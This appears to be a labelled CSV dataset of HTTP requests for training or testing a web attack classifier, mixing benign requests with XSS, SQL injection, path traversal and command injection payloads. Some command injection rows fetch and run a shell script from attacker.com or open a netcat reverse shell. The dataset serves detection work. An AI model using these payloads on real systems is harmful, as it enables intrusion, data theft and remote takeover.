request_text,label
"GET /profile?q=<ScRiPt>alert(1)</ScRiPt> HTTP/1.1
Host: example.com",xss
"POST /api/execute HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=8.8.8.8; uname -a",cmdi
"GET /files?file=..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: example.com",traversal
"GET /static?file=..%u2215etc%u2215passwd HTTP/1.1
Host: example.com",traversal
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=diana&password=SecureP@ss1",benign
"GET /product?q=admin'-- HTTP/1.1
Host: example.com",sqli
"POST /admin/login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=%27 OR %271%27=%271&password=test",sqli
"POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1| dir C:\",cmdi
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=ivan&password=SecureP@ss1",benign
"GET /posts?q=<img src=x onerror=prompt(1)> HTTP/1.1
Host: example.com",xss
"DELETE /api/cart/item/721 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"GET /view?file=../../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /images?file=php://input HTTP/1.1
Host: example.com",traversal
"GET /user?q=1 OR 1=1 HTTP/1.1
Host: example.com",sqli
"POST /exec HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1| type C:\Windows\System32\drivers\etc\hosts",cmdi
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' OR EXISTS(SELECT * FROM users WHERE username='admin')--&password=test",sqli
"GET /download?file=../../../../var/www/html/.htpasswd HTTP/1.1
Host: example.com",traversal
"PUT /api/users/frank HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""frank@email.com"",""name"":""Frank""}",benign
"GET /files?file=..%c0%afetc%c0%afpasswd HTTP/1.1
Host: example.com",traversal
"GET /cart HTTP/1.1
Host: example.com
Authorization: Bearer key_xyz123",benign
"GET /api/execute?host=test$(whoami) HTTP/1.1
Host: example.com",cmdi
"GET /checkout?q='; INSERT INTO users (username,password) VALUES ('hacked','hacked')-- HTTP/1.1
Host: example.com",sqli
"GET /checkout?q=1 UNION SELECT version()-- HTTP/1.1
Host: example.com",sqli
"GET /api/execute?host=192.168.1.1&& uname -a HTTP/1.1
Host: example.com",cmdi
"GET /files?file=....//etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /download?file=..\..\..\windows\win.ini HTTP/1.1
Host: example.com",traversal
"GET /files?file=%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /search?q=blue shirt&page=4&sort=asc HTTP/1.1
Host: example.com",benign
"GET /files?file=%2e%2e%2fetc%2fpasswd HTTP/1.1
Host: example.com",traversal
"GET /cart HTTP/1.1
Host: example.com
Authorization: Bearer token_abc456",benign
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=&#60;script&#62;alert(1)&#60;/script&#62;&user=test",xss
"POST /debug HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test; curl http://attacker.com/shell.sh | bash",cmdi
"GET /debug?host=192.168.1.1; ls -la HTTP/1.1
Host: example.com",cmdi
"GET /comment?q=<object data=javascript:alert(1)> HTTP/1.1
Host: example.com",xss
"GET /api/execute?host=localhost; curl http://attacker.com/shell.sh | bash HTTP/1.1
Host: example.com",cmdi
"GET /search?q=';alert(String.fromCharCode(88,83,83))// HTTP/1.1
Host: example.com",xss
"POST /api/execute HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1`whoami`",cmdi
"PUT /api/users/grace HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""grace@email.com"",""name"":""Grace""}",benign
"GET /api/file?file=..%c0%afetc%c0%afpasswd HTTP/1.1
Host: example.com",traversal
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<input onfocus=alert(1) autofocus>&user=test",xss
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<iframe onload=alert(1)>&user=test",xss
"POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1| uname -a",cmdi
"GET /search?q='; DROP TABLE users; -- HTTP/1.1
Host: example.com",sqli
"POST /admin/login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1; WAITFOR DELAY '0:0:5'--&password=test",sqli
"GET /static?file=../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=diana&password=SecureP@ss1",benign
"GET /ping?host=192.168.1.1| ls -la / HTTP/1.1
Host: example.com",cmdi
"GET /files?file=....//etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment='; alert(1); var x='&user=test",xss
"GET /view?file=php://input HTTP/1.1
Host: example.com",traversal
"POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1; ping -c 5 attacker.com",cmdi
"GET /exec?host=8.8.8.8$(whoami) HTTP/1.1
Host: example.com",cmdi
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<svg onload=prompt(document.domain)>&user=test",xss
"DELETE /api/cart/item/83 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"GET /wishlist HTTP/1.1
Host: example.com
Authorization: Bearer bearer_987def",benign
"DELETE /api/cart/item/951 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment='; alert(1); var x='&user=test",xss
"GET /files/image.png HTTP/1.1
Host: example.com",benign
"GET /api/auth?q=%27 OR %271%27=%271 HTTP/1.1
Host: example.com",sqli
"PUT /api/users/eve HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""eve@email.com"",""name"":""Eve""}",benign
"GET /files/invoice_2024.pdf HTTP/1.1
Host: example.com",benign
"GET /download?file=..\..\windows\system32 HTTP/1.1
Host: example.com",traversal
"GET /api/auth?q=admin'-- HTTP/1.1
Host: example.com",sqli
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<img src=x onerror=prompt(1)>&user=test",xss
"GET /feedback?q=<details open ontoggle=alert(1)> HTTP/1.1
Host: example.com",xss
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=john_doe&password=SecureP@ss1",benign
"POST /tools HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=localhost&& id",cmdi
"POST /api/auth HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=') OR ('1'='1&password=test",sqli
"GET /static?file=/../../boot.ini HTTP/1.1
Host: example.com",traversal
"GET /orders HTTP/1.1
Host: example.com
Authorization: Bearer bearer_987def",benign
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' AND SLEEP(5)--&password=test",sqli
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1' ORDER BY 1--&password=test",sqli
"GET /user?q='; EXEC master..xp_cmdshell('dir')-- HTTP/1.1
Host: example.com",sqli
"GET /api/auth?q=0x27 OR 0x31=0x31-- HTTP/1.1
Host: example.com",sqli
"GET /files?file=../../../var/log/apache2/access.log HTTP/1.1
Host: example.com",traversal
"GET /contact HTTP/1.1
Host: example.com
Authorization: Bearer key_xyz123",benign
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=""><script>alert(1)</script>&user=test",xss
"GET /exec?host=test; id HTTP/1.1
Host: example.com",cmdi
"GET /files/image.png HTTP/1.1
Host: example.com",benign
"POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=8.8.8.8; printenv",cmdi
"PUT /api/users/alice HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""alice@email.com"",""name"":""Alice""}",benign
"GET /exec?host=192.168.1.1; curl http://attacker.com/shell.sh | bash HTTP/1.1
Host: example.com",cmdi
"DELETE /api/cart/item/879 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"GET /ping?host=test; cat /etc/passwd HTTP/1.1
Host: example.com",cmdi
"GET /product/brand_apple HTTP/1.1
Host: example.com
Accept: application/json",benign
"GET /tools?host=8.8.8.8; nc -e /bin/sh attacker.com 4444 HTTP/1.1
Host: example.com",cmdi
"GET /search?q=laptop&page=10&sort=asc HTTP/1.1
Host: example.com",benign
"PUT /api/users/frank HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""frank@email.com"",""name"":""Frank""}",benign
"GET /admin/login?q='; EXEC xp_cmdshell('whoami')-- HTTP/1.1
Host: example.com",sqli
"POST /debug HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1; id",cmdi
"POST /user HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' HAVING 1=1--&password=test",sqli
"GET /download?file=../../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=""><script>alert(1)</script>&user=test",xss
"POST /user HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1; WAITFOR DELAY '0:0:5'--&password=test",sqli
"GET /files/style.css HTTP/1.1
Host: example.com",benign
"POST /run HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1| find / -perm -4000 2>/dev/null",cmdi
"GET /ping?host=test; curl http://attacker.com/shell.sh | bash HTTP/1.1
Host: example.com",cmdi
"DELETE /api/cart/item/588 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=alice&password=SecureP@ss1",benign
"GET /api/file?file=/proc/self/cmdline HTTP/1.1
Host: example.com",traversal
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=-moz-binding: url(http://attacker.com/xss.xml#xss)&user=test",xss
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1 OR 1=1&password=test",sqli
"GET /view?file=../../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /static?file=expect://id HTTP/1.1
Host: example.com",traversal
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<script>alert('XSS')</script>&user=test",xss
"GET /product?q=1' GROUP BY 1-- HTTP/1.1
Host: example.com",sqli
"GET /download?file=../../../etc/shadow HTTP/1.1
Host: example.com",traversal
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<script>alert('XSS')</script>&user=test",xss
"PUT /api/users/judy HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""judy@email.com"",""name"":""Judy""}",benign
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=ivan&password=SecureP@ss1",benign
"GET /download?file=..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: example.com",traversal
"GET /files?file=../../../etc/hosts HTTP/1.1
Host: example.com",traversal
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=diana&password=SecureP@ss1",benign
"PUT /api/users/judy HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""judy@email.com"",""name"":""Judy""}",benign
"GET /admin/login?q=1 AND updatexml(1,concat(0x7e,user()),1)-- HTTP/1.1
Host: example.com",sqli
"GET /api/file?file=..\..\..\windows\win.ini HTTP/1.1
Host: example.com",traversal
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=javascript:alert(document.cookie)&user=test",xss
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<img src=x onerror=confirm(1)>&user=test",xss
"GET /feedback?q=<embed src=javascript:alert(1)> HTTP/1.1
Host: example.com",xss
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<details open ontoggle=alert(1)>&user=test",xss
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1 UNION SELECT @@datadir--&password=test",sqli
"GET /run?host=test$(whoami) HTTP/1.1
Host: example.com",cmdi
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=%3Cscript%3Ealert(1)%3C/script%3E&user=test",xss
"GET /api/execute?host=check&& uname -a HTTP/1.1
Host: example.com",cmdi
"POST /exec HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=localhost`id`",cmdi
"GET /run?host=localhost$(cat /etc/group) HTTP/1.1
Host: example.com",cmdi
"GET /api/execute?host=test&& whoami HTTP/1.1
Host: example.com",cmdi
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' OR 1=1--&password=test",sqli
"DELETE /api/cart/item/939 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"GET /static?file=../../../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /files/photo.jpg HTTP/1.1
Host: example.com",benign
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1' AND 1=2--&password=test",sqli
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1; DELETE FROM users--&password=test",sqli
"GET /files?file=%5c..%5c..%5cwindows%5csystem32 HTTP/1.1
Host: example.com",traversal
"GET /checkout?q=1 OR 1=1-- HTTP/1.1
Host: example.com",sqli
"GET /debug?host=test; whoami HTTP/1.1
Host: example.com",cmdi
"PUT /api/users/diana HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""diana@email.com"",""name"":""Diana""}",benign
"GET /api/data?limit=74&offset=108&format=json HTTP/1.1
Host: example.com",benign
"GET /product?q=0x27 OR 0x31=0x31-- HTTP/1.1
Host: example.com",sqli
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1' AND extractvalue(1,concat(0x7e,version()))--&password=test",sqli
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1' OR '1'='1'--&password=test",sqli
"GET /checkout?q=1 AND SLEEP(5)-- HTTP/1.1
Host: example.com",sqli
"GET /files?file=..%252f..%252fetc%252fpasswd HTTP/1.1
Host: example.com",traversal
"POST /admin/login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1' ORDER BY 10--&password=test",sqli
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1 UNION SELECT user()--&password=test",sqli
"POST /debug HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1`whoami`",cmdi
"GET /product?q=1' GROUP BY 1-- HTTP/1.1
Host: example.com",sqli
"GET /api/data?limit=85&offset=162&format=json HTTP/1.1
Host: example.com",benign
"POST /run HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1& dir",cmdi
"GET /view?file=..%c1%9cetc%c1%9cpasswd HTTP/1.1
Host: example.com",traversal
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<svg onload=alert(1)>&user=test",xss
"GET /search?q=python book&page=9&sort=asc HTTP/1.1
Host: example.com",benign
"GET /static?file=../../../etc/shadow HTTP/1.1
Host: example.com",traversal
"GET /search?q=<body onload=alert(1)> HTTP/1.1
Host: example.com",xss
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=""><script>alert(1)</script>&user=test",xss
"GET /api/file?file=%2e%2e%2fetc%2fpasswd HTTP/1.1
Host: example.com",traversal
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username='; EXEC xp_cmdshell('whoami')--&password=test",sqli
"POST /api/execute HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test| set",cmdi
"GET /api/products HTTP/1.1
Host: example.com
Authorization: Bearer bearer_987def",benign
"GET /login?q='; INSERT INTO users (username,password) VALUES ('hacked','hacked')-- HTTP/1.1
Host: example.com",sqli
"PUT /api/users/heidi HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""heidi@email.com"",""name"":""Heidi""}",benign
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<img src='x' onerror='alert(document.cookie)'>&user=test",xss
"GET /comment?q=<script>alert(document.cookie)</script> HTTP/1.1
Host: example.com",xss
"GET /files/data.csv HTTP/1.1
Host: example.com",benign
"GET /search?q=' AND 1=0 UNION SELECT '1','2','3'-- HTTP/1.1
Host: example.com",sqli
"GET /admin/login?q=' OR '1'='1 HTTP/1.1
Host: example.com",sqli
"GET /files/invoice_2024.pdf HTTP/1.1
Host: example.com",benign
"GET /home HTTP/1.1
Host: example.com
Authorization: Bearer key_xyz123",benign
"GET /api/auth?q=' OR 1=1# HTTP/1.1
Host: example.com",sqli
"GET /api/execute?host=localhost; whoami HTTP/1.1
Host: example.com",cmdi
